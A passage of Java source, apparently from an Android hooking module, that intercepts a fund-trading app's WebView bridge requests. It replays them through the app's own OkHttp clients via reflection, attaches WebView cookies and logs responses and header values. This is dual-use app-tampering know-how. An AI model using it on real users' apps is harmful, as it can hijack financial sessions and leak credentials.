                    String responseData = executeNativeHttpRequest(method, url, dataJson);

                    // 构造响应 JSON
                    String response = "{\"responseId\":\"" + callbackId + "\",\"responseData\":" + responseData + "}";

                    // 通过 evaluateJavascript 返回给 H5
                    if (webView != null) {
                        String jsCode = "javascript:(function(){" +
                                "if(window.WebViewJavascriptBridge && " +
                                "typeof window.WebViewJavascriptBridge._handleMessageFromObjC === 'function'){" +
                                "window.WebViewJavascriptBridge._handleMessageFromObjC('" +
                                response.replace("'", "\\'").replace("\n", "\\n") + "');" +
                                "}})();";

                        // 在主线程执行
                        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
                            try {
                                java.lang.reflect.Method evalMethod = webView.getClass().getMethod(
                                        "evaluateJavascript", String.class,
                                        Class.forName("android.webkit.ValueCallback"));
                                evalMethod.invoke(webView, jsCode, null);
                                Log.i(TAG, ">>> Response delivered via evaluateJavascript");
                            } catch (Exception e) {
                                Log.e(TAG, "Failed to deliver response", e);
                            }
                        });
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Native HTTP request failed", e);
                }
            }).start();

            return "intercepted"; // 返回 non-null 表示已拦截
            DISABLED FOR DEBUGGING - END */
        } catch (Exception e) {
            Log.e(TAG, "interceptClientRequestHX failed", e);
            return null;
        }
    }

    /**
     * 使用 Native HTTP 库执行请求
     */
    private static String executeNativeHttpRequest(String method, String url, String dataJson) throws Exception {
        Log.i(TAG, ">>> Executing native HTTP: " + method + " " + url);

        // 提取 params
        String paramsJson = extractJsonObject(dataJson, "params");

        // 提取 Header
        String headerJson = extractJsonObject(dataJson, "Header");

        // 优先使用 OkHttp
        if (domainClients.size() > 0) {
            return executeWithOkHttp(method, url, paramsJson, headerJson);
        } else {
            return executeWithHttpURLConnection(method, url, paramsJson, headerJson);
        }
    }

    /**
     * 使用 OkHttp 执行请求
     */
    private static String executeWithOkHttp(String method, String url, String paramsJson, String headerJson) throws Exception {
        // 获取任意一个 OkHttpClient（优先 trade.5ifund.com 域名的）
        Object client = null;
        for (Object c : domainClients.values()) {
            client = c;
            break;
        }
        if (client == null) {
            throw new Exception("No OkHttpClient available");
        }

        ClassLoader cl = client.getClass().getClassLoader();
        Class<?> requestBuilderClass = cl.loadClass("okhttp3.Request$Builder");
        Class<?> requestClass = cl.loadClass("okhttp3.Request");
        Class<?> responseClass = cl.loadClass("okhttp3.Response");
        Class<?> requestBodyClass = cl.loadClass("okhttp3.RequestBody");
        Class<?> mediaTypeClass = cl.loadClass("okhttp3.MediaType");

        // 创建 Request.Builder
        Object builder = requestBuilderClass.getDeclaredConstructor().newInstance();
        java.lang.reflect.Method urlMethod = requestBuilderClass.getMethod("url", String.class);
        builder = urlMethod.invoke(builder, url);

        // 添加 Headers
        if (headerJson != null && !headerJson.isEmpty()) {
            // TODO: 解析 Header JSON 并添加
        }

        // 构造请求
        if ("POST".equalsIgnoreCase(method) && paramsJson != null && !paramsJson.isEmpty()) {
            // 创建 RequestBody
            java.lang.reflect.Method parseMethod = mediaTypeClass.getMethod("parse", String.class);
            Object mediaType = parseMethod.invoke(null, "application/json; charset=utf-8");

            java.lang.reflect.Method createMethod = requestBodyClass.getMethod("create",
                    mediaTypeClass, String.class);
            Object body = createMethod.invoke(null, mediaType, paramsJson);

            java.lang.reflect.Method postMethod = requestBuilderClass.getMethod("post", requestBodyClass);
            builder = postMethod.invoke(builder, body);
        } else {
            java.lang.reflect.Method getMethod = requestBuilderClass.getMethod("get");
            builder = getMethod.invoke(builder);
        }

        // 构建 Request
        java.lang.reflect.Method buildMethod = requestBuilderClass.getMethod("build");
        Object request = buildMethod.invoke(builder);

        // 执行请求
        java.lang.reflect.Method newCallMethod = client.getClass().getMethod("newCall", requestClass);
        Object call = newCallMethod.invoke(client, request);

        java.lang.reflect.Method executeMethod = call.getClass().getMethod("execute");
        Object response = executeMethod.invoke(call);

        // 读取响应
        java.lang.reflect.Method bodyMethod = responseClass.getMethod("body");
        Object responseBody = bodyMethod.invoke(response);

        java.lang.reflect.Method stringMethod = responseBody.getClass().getMethod("string");
        String responseStr = (String) stringMethod.invoke(responseBody);

        if (SENSITIVE_PAYLOAD_LOGGING) {
            Log.i(TAG, ">>> Native HTTP response: " + responseStr.substring(0, Math.min(500, responseStr.length())));
        }

        return responseStr;
    }

    /**
     * 使用 HttpURLConnection 执行请求
     */
    private static String executeWithHttpURLConnection(String method, String url, String paramsJson, String headerJson) throws Exception {
        Log.i(TAG, ">>> Using HttpURLConnection");

        java.net.URL urlObj = new java.net.URL(url);
        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) urlObj.openConnection();

        conn.setRequestMethod(method);
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);

        // 添加默认 Headers
        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setRequestProperty("Accept", "application/json");

        // 从 WebView CookieManager 中读取 Cookie
        try {
            Class<?> cookieManagerClass = Class.forName("android.webkit.CookieManager");
            java.lang.reflect.Method getInstance = cookieManagerClass.getMethod("getInstance");
            Object cookieManager = getInstance.invoke(null);
            java.lang.reflect.Method getCookie = cookieManagerClass.getMethod("getCookie", String.class);
            String cookies = (String) getCookie.invoke(cookieManager, url);
            if (cookies != null && !cookies.isEmpty()) {
                conn.setRequestProperty("Cookie", cookies);
                Log.i(TAG, ">>> Added Cookie, len=" + cookies.length());
            } else {
                Log.w(TAG, ">>> No cookies found for: " + url);
            }
        } catch (Exception e) {
            Log.e(TAG, ">>> Failed to get cookies: " + e.getMessage());
        }

        // 解析并添加自定义 Headers
        if (headerJson != null && !headerJson.isEmpty()) {
            Log.i(TAG, ">>> Adding custom headers");
            String[] headerPairs = headerJson.replace("{", "").replace("}", "").split(",");
            for (String pair : headerPairs) {
                int colonIdx = pair.indexOf(":");
                if (colonIdx > 0) {
                    String key = pair.substring(0, colonIdx).trim();
                    String value = pair.substring(colonIdx + 1).trim();
                    // 去掉引号
                    if (key.startsWith("\"") && key.endsWith("\"")) key = key.substring(1, key.length() - 1);
                    if (value.startsWith("\"") && value.endsWith("\"")) value = value.substring(1, value.length() - 1);
                    if (!key.isEmpty() && !value.isEmpty()) {
                        conn.setRequestProperty(key, value);
                        Log.i(TAG, ">>> Added header: " + key + " = " + value.substring(0, Math.min(50, value.length())));
                    }
                }
            }
        }

        if ("POST".equalsIgnoreCase(method) && paramsJson != null && !paramsJson.isEmpty()) {
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            java.io.OutputStream os = conn.getOutputStream();
            os.write(paramsJson.getBytes("UTF-8"));
            os.flush();
            os.close();
        }

        int responseCode = conn.getResponseCode();
        Log.i(TAG, ">>> Response code: " + responseCode);

        java.io.InputStream is = (responseCode < 400) ? conn.getInputStream() : conn.getErrorStream();
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(is, "UTF-8"));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            sb.append(line);
        }
        reader.close();
        conn.disconnect();

        String responseStr = sb.toString();
        Log.i(TAG, ">>> HttpURLConnection response: " + responseStr.substring(0, Math.min(500, responseStr.length())));

        return responseStr;
    }
}
